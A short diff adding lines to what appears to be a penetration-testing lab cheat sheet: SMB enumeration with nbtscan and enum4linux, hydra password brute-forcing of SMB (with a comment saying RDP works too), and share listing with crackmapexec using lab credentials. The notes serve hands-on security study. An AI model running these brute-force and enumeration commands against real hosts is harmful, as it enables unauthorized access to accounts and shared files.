@@ -45,5 +45,14 @@
   nmap -sU -p161 -sC 10.10.10.*
   snmp-check 10.10.10.16
   nmap -sU -p161 --script snmp-win32-users 10.10.10.16
+  nbtscan 10.10.10.1-254
+  enum4linux 10.10.10.16
+  hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst smb://10.10.10.16
+  hydra -l jason -P /usr/share/wordlists/nmap.lst smb://10.10.10.16
+    smb可換rdp
+  enum4linux -u martin -p apple -a 10.10.10.16
+    -a可替換-S -U -P
+  python3 -m pip install --upgrade impacket
+  crackmapexec smb 10.10.10.16 -u martin -p apple --shares
   ```
 </details>
